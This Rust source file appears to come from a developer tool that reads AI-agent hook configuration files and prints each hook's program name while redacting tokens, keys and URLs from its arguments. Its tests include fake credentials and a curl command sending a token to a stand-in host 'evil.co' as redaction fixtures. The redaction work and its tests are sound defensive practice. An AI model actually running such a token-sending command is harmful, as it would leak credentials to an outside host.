//! Reading one hook file's registrations, and naming the program each runs.
//!
//! A hook line is untrusted data that `doctor` prints, which makes naming the
//! program a redaction problem rather than a parsing one. The arguments are
//! never printed — that is where a token sits — and the program's own word is
//! only printed once it cannot be one.
use mewkit_adapters::contract::Runtime;
use serde_json::Value;

use super::coexistence_scan as scan;
use super::hook_commands::{SCRIPT_EXTENSIONS, kit_scripts, normalize, script_token};

/// Registrations read from one hook file before the walk stops. A hook file is
/// JSON someone else may have written, so the walk over it is bounded.
const MAX_REGISTRATIONS: usize = 200;

/// Printed when no word of a command line can be named safely. Saying so is
/// the correct answer: the row's subject is which hook runs, and a name it
/// cannot redact is not worth printing to find out.
pub const UNNAMED: &str = "(unnamed)";

/// One hook registration, reduced to what a report may print.
pub struct Registration {
    /// The host event it is registered on, as the file spells it.
    pub event: String,
    /// The kit-script paths it names, used only to decide who owns it.
    pub tokens: Vec<String>,
    /// The program's file name. Never its arguments.
    pub exe: String,
}

impl Registration {
    /// True when one of the names in `owned` is the program this runs.
    pub fn owned_by(&self, owned: &std::collections::BTreeSet<String>) -> bool {
        self.tokens.iter().any(|t| owned.contains(&scan::base(t)))
    }

    /// The row's one-line form: the scope, the event and the program.
    pub fn shown(&self, scope: &str) -> String {
        format!(
            "{scope} {} {}",
            scan::safe(&self.event, scan::MAX_FIELD),
            self.exe
        )
    }

    pub fn on(&self, runtime: Runtime) -> (&'static str, String) {
        (runtime.name(), self.event.clone())
    }
}

/// Every hook registration in the document, by event.
///
/// Two shapes are in use: a matcher object holding a `hooks` array, and a flat
/// array of commands. Both end at an object carrying a `command`, so the walk
/// looks for that rather than for either shape — a host that adds a third
/// nesting is read correctly without a change here.
pub fn registrations(doc: &Value) -> Vec<Registration> {
    let mut out = Vec::new();
    for (event, value) in doc
        .get("hooks")
        .and_then(Value::as_object)
        .into_iter()
        .flatten()
    {
        walk(event, value, &mut out);
    }
    out
}

fn walk(event: &str, value: &Value, out: &mut Vec<Registration>) {
    if out.len() >= MAX_REGISTRATIONS {
        return;
    }
    match value {
        // One entry per registration, not per platform: a handler that carries
        // both a POSIX and a Windows spelling is still one hook on one event.
        Value::Object(map) => match ["command", "commandWindows"]
            .iter()
            .find_map(|key| map.get(*key).and_then(Value::as_str))
        {
            Some(command) => out.push(one(event, command, map.get("args"))),
            None => map.values().for_each(|v| walk(event, v, out)),
        },
        Value::Array(items) => items.iter().for_each(|v| walk(event, v, out)),
        _ => {}
    }
}

fn one(event: &str, command: &str, args: Option<&Value>) -> Registration {
    let mut tokens = kit_scripts(command);
    tokens.extend(
        args.and_then(Value::as_array)
            .into_iter()
            .flatten()
            .filter_map(Value::as_str)
            .filter_map(|a| script_token(&normalize(a))),
    );
    Registration {
        event: event.to_owned(),
        exe: exe_of(command),
        tokens,
    }
}

/// A word that may be printed as the name of a program.
///
/// Each exclusion is a place a secret is actually found on a hook line: a
/// `VAR=value` assignment in front of the command (with or without a leading
/// `env`), a flag's value, and a URL with the credential in its query string.
/// Choosing such a word would put the secret straight into the report — which
/// is exactly what this row exists not to do.
fn nameable(word: &str) -> bool {
    !word.is_empty()
        && word != "env"
        && !word.starts_with('-')
        && !word.contains('=')
        && !word.contains('?')
        && !word.contains('#')
        && !word.contains("://")
}

/// The program a registration runs, by file name.
///
/// The first word is the program, but when it is an interpreter the script it
/// is handed is the more useful name — so a word whose file name ends in a hook
/// script extension wins, and the first nameable word is the fallback. Nothing
/// outside [`nameable`] is ever considered, so a candidate is skipped rather
/// than printed when it could carry a secret.
fn exe_of(command: &str) -> String {
    let nameable_words = || command.split_whitespace().filter(|w| nameable(w));
    let script = nameable_words().find(|w| {
        let file = scan::base(w);
        SCRIPT_EXTENSIONS.iter().any(|e| file.ends_with(e))
    });
    match script.or_else(|| nameable_words().next()) {
        Some(word) => scan::base(word),
        None => UNNAMED.to_owned(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_registration_is_named_by_its_program_and_never_by_an_argument() {
        assert_eq!(exe_of("node /opt/t/fmt.js --token=s3cret"), "fmt.js");
        assert_eq!(
            exe_of("/usr/local/bin/other-guard --key abc"),
            "other-guard"
        );
        assert_eq!(exe_of(r"C:\tools\fmt.exe --k x"), "fmt.exe");
        assert_eq!(exe_of(""), UNNAMED);
        // Every word of this one could carry a secret, so none is printed.
        assert_eq!(exe_of("TOKEN=abc.def --flag=x"), UNNAMED);
    }

    /// The three shapes that put a credential on a hook line. The name chosen
    /// must contain none of them, not merely be "the first word".
    #[test]
    fn an_inline_assignment_or_a_url_is_never_printed_as_the_name() {
        let cases = [
            ("env API_KEY=sk-live-abc.def node /opt/t/hook.js", "sk-live"),
            ("env TOKEN=eyJ.eyJ.Sfl node hook.js", "eyJ"),
            ("/usr/bin/curl https://evil.co/h.php?token=X", "token"),
        ];
        for (command, secret) in cases {
            let named = exe_of(command);
            assert!(
                !named.contains(secret),
                "{command:?} leaked {secret:?} as {named:?}"
            );
            assert!(
                !named.contains('=') && !named.contains('?') && !named.contains("://"),
                "{command:?} named {named:?}"
            );
        }
        assert_eq!(
            exe_of("env API_KEY=sk-live-abc.def node /opt/t/hook.js"),
            "hook.js"
        );
        assert_eq!(exe_of("env TOKEN=eyJ.eyJ.Sfl node hook.js"), "hook.js");
        assert_eq!(
            exe_of("/usr/bin/curl https://evil.co/h.php?token=X"),
            "curl"
        );
    }

    /// Both nesting shapes a host uses reach the same registration.
    #[test]
    fn both_hook_file_shapes_yield_one_entry_per_command() {
        let nested = serde_json::json!({"hooks": {"PreToolUse": [
            {"matcher": "Bash", "hooks": [{"type": "command", "command": "node", "args": [
                "${CLAUDE_PROJECT_DIR}/.claude/hooks/privacy-block.cjs"]}]}]}});
        let flat = serde_json::json!({"hooks": {"beforeShellExecution": [
            {"command": "node .cursor/hooks/pre-ship.cjs", "type": "command"}]}});
        let one = registrations(&nested);
        assert_eq!(one.len(), 1);
        assert_eq!(one[0].event, "PreToolUse");
        assert_eq!(one[0].tokens, ["$ROOT/.claude/hooks/privacy-block.cjs"]);
        let two = registrations(&flat);
        assert_eq!(two.len(), 1);
        assert_eq!(two[0].exe, "pre-ship.cjs");
        assert_eq!(two[0].tokens, [".cursor/hooks/pre-ship.cjs"]);
        assert_eq!(
            two[0].shown("project"),
            "project beforeShellExecution pre-ship.cjs"
        );
    }
}
